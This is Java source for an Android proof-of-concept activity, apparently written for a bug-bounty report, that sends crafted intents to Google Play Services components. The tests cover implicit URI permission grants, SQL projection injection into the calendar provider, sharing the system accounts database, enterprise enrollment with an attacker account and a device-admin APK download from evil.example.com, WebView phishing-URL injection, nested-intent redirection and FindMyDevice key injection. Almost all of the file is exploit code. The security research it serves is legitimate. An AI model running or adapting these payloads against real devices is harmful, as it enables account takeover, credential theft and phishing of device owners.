package com.vrp.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CompatDeepImpactActivity extends Activity {
    private static final String TAG = "CompatDeepImpact";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("Compat Changes Deep Impact PoC\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testImplicitUriPermissionGrant();
        testRestrictDataUriColumns();
        testGmsPayWithCraftedData();
        testNearbyShareInjection();
        testEmmEnrollmentBypass();
        testBackupSettingsAccess();
        testGrowthWebViewAccess();
        testIntentRedirectChain();
        log("\n=== ALL DEEP IMPACT TESTS COMPLETE ===");
    }

    private void testImplicitUriPermissionGrant() {
        log("=== TEST 1: DETECT_IMPLICIT_URI_PERMISSION_GRANT bypass ===");
        log("CompatChange 460838111 — enableSinceTargetSdk=37 (NOT enforced)\n");

        // Test: Can we pass a content:// URI with FLAG_GRANT_READ_URI_PERMISSION
        // to a component that forwards it, without the system detecting the implicit grant?
        try {
            Uri targetUri = Uri.parse("content://com.google.android.gms.auth/accounts");
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(targetUri);
            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            i.setPackage("com.google.android.gms");
            startActivity(i);
            log("[SENT] Intent with FLAG_GRANT_READ_URI_PERMISSION to GMS");
        } catch (SecurityException e) {
            log("[BLOCKED] URI grant: " + shorten(e.getMessage(), 100));
        } catch (Exception e) {
            log("[ERROR] URI grant: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test: Create an intent that passes a content URI to a GMS activity
        // that might forward it to another component
        try {
            Uri contactUri = Uri.parse("content://contacts/people/1");
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.nearby.sharing.main.MainActivity"));
            i.setAction(Intent.ACTION_SEND);
            i.putExtra(Intent.EXTRA_STREAM, contactUri);
            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            i.setType("text/vcard");
            startActivity(i);
            log("[SENT] NearbyShare with contact URI + grant flag");
        } catch (Exception e) {
            log("[ERROR] NearbyShare URI: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testRestrictDataUriColumns() {
        log("\n=== TEST 2: RESTRICT_DATA_URI_COLUMNS bypass ===");
        log("CompatChange 437318646 — enableSinceTargetSdk=37 (NOT enforced)\n");

        // Test: Query a ContentProvider and check if data: URIs in columns work
        // The compat change when enabled would strip data: URIs from query results
        // With it disabled, data: URIs can be embedded in column values

        // Test CalendarProvider — we know it's injectable
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/calendars"),
                new String[]{"_id", "name", "'data:text/html,<h1>injected</h1>' AS data_uri_col"},
                null, null, null
            );
            if (c != null) {
                log("Calendar query with data: URI column: " + c.getCount() + " rows");
                if (c.moveToFirst()) {
                    int idx = c.getColumnIndex("data_uri_col");
                    if (idx >= 0) {
                        String val = c.getString(idx);
                        log("[VULN] data: URI column returned: " + shorten(val, 60));
                        log("RESTRICT_DATA_URI_COLUMNS is NOT enforced — data URIs pass through");
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            log("data URI col: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test with base64 data URI
        try {
            String payload = "data:application/octet-stream;base64,SGVsbG8=";
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/calendars"),
                new String[]{"_id", "'" + payload + "' AS binary_uri"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                String val = c.getString(c.getColumnIndex("binary_uri"));
                log("[VULN] binary data: URI in column: " + shorten(val, 60));
                c.close();
            }
        } catch (Exception e) {
            log("binary data URI: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testGmsPayWithCraftedData() {
        log("\n=== TEST 3: Google Pay Activity with crafted data ===");

        // AliasProcessImageResourceActivity — handles SEND with image mime types
        // Testing with crafted extras to see if it processes our data
        try {
            Intent i = new Intent(Intent.ACTION_SEND);
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.pay.deeplink.AliasProcessImageResourceActivity"));
            i.setType("image/*");
            i.putExtra(Intent.EXTRA_STREAM, Uri.parse("content://com.vrp.poc.fake/exploit.png"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] Pay image activity with crafted content URI");
        } catch (Exception e) {
            log("[ERROR] Pay image: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // AliasProcessAdditionalMimeTypesActivity
        try {
            Intent i = new Intent(Intent.ACTION_SEND);
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.pay.deeplink.AliasProcessAdditionalMimeTypesActivity"));
            i.setType("application/pdf");
            i.putExtra(Intent.EXTRA_STREAM, Uri.parse("content://com.vrp.poc.fake/document.pdf"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] Pay additional mime with crafted content URI");
        } catch (Exception e) {
            log("[ERROR] Pay additional: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testNearbyShareInjection() {
        log("\n=== TEST 4: NearbyShare with malicious data ===");

        // Test sharing crafted file URIs to Nearby Share
        try {
            Intent i = new Intent(Intent.ACTION_SEND);
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.nearby.sharing.main.MainActivity"));
            i.setType("*/*");
            // Try to share a system file via NearbyShare
            i.putExtra(Intent.EXTRA_STREAM, Uri.parse("file:///data/system/users/0/accounts_de.db"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] NearbyShare with system file URI");
        } catch (Exception e) {
            log("[ERROR] NearbyShare file: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test with content URI pointing to sensitive data
        try {
            Intent i = new Intent(Intent.ACTION_SEND);
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.nearby.sharing.main.MainActivity"));
            i.setType("text/plain");
            i.putExtra(Intent.EXTRA_TEXT, "Injected text that appears in NearbyShare");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            log("[SENT] NearbyShare with injected text");
        } catch (Exception e) {
            log("[ERROR] NearbyShare text: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testEmmEnrollmentBypass() {
        log("\n=== TEST 5: EMM Activity — enterprise enrollment ===");

        // EmmActivity handles HANDLE_MANAGED action but we bypass the filter
        try {
            Intent i = new Intent("com.google.android.gms.auth.account.HANDLE_MANAGED");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.managed.ui.EmmActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // Inject account and device policy data
            i.putExtra("accountName", "attacker@evil.corp");
            i.putExtra("accountType", "com.google");
            i.putExtra("is_setup_wizard", true);
            i.putExtra("deviceAdminDownloadUrl", "https://evil.example.com/admin.apk");
            i.putExtra("deviceAdminPackageName", "com.evil.admin");
            startActivity(i);
            log("[SENT] EMM with attacker-controlled account + device admin extras");
        } catch (Exception e) {
            log("[ERROR] EMM: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testBackupSettingsAccess() {
        log("\n=== TEST 6: GMS Backup Settings ===");

        // BackupSettings reached with null/wrong action — what data does it show?
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.backup.component.BackupSettingsActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // Try to pass extras that control what the activity shows
            i.putExtra("account", "sandiyotest@gmail.com");
            i.putExtra("show_advanced", true);
            startActivity(i);
            log("[SENT] BackupSettings with account extra");
        } catch (Exception e) {
            log("[ERROR] Backup: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testGrowthWebViewAccess() {
        log("\n=== TEST 7: GMS Growth WebView — URL injection ===");

        // GrowthWebViewActivity handles web views for GMS growth features
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.growth.ui.webview.GrowthWebViewActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // Try to inject a URL — if the activity loads it, we control the webview content
            i.putExtra("url", "https://evil.example.com/phishing");
            i.putExtra("KEY_URL", "https://evil.example.com/phishing");
            i.putExtra("extra_url", "https://evil.example.com/phishing");
            i.setData(Uri.parse("https://evil.example.com/phishing"));
            startActivity(i);
            log("[SENT] GrowthWebView with injected URL in multiple extras");
        } catch (Exception e) {
            log("[ERROR] GrowthWebView: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private void testIntentRedirectChain() {
        log("\n=== TEST 8: Intent redirect via KidSetup ===");

        // KidSetupActivity was reachable with wrong action
        // Test if it processes a nested intent (Intent redirect / StrandHogg-like)
        try {
            Intent inner = new Intent();
            inner.setComponent(new ComponentName("com.android.settings",
                "com.android.settings.Settings"));
            inner.setAction("android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS");

            Intent i = new Intent();
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.kids.KidSetupActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("android.intent.extra.INTENT", inner);
            i.putExtra("next_intent", inner);
            i.putExtra("pending_intent", inner);
            startActivity(i);
            log("[SENT] KidSetup with nested intent extras");
        } catch (Exception e) {
            log("[ERROR] IntentRedirect: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }

        // Test FindMyDevice exported alias with crafted key data
        try {
            Intent i = new Intent("com.google.android.gms.findmydevice.spot.e2ee.ui.SYNC_OWNER_KEY");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.findmydevice.spot.e2ee.ui.ExportedSyncOwnerKeyActivityAlias"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // Inject key sync data
            i.putExtra("owner_key", new byte[]{0x41, 0x42, 0x43, 0x44});
            i.putExtra("device_id", "attacker_device_123");
            i.putExtra("sync_token", "fake_token");
            startActivity(i);
            log("[SENT] FindMyDevice sync with injected key data");
        } catch (Exception e) {
            log("[ERROR] FindMyDevice key: " + e.getClass().getSimpleName() + " " + shorten(e.getMessage(), 80));
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
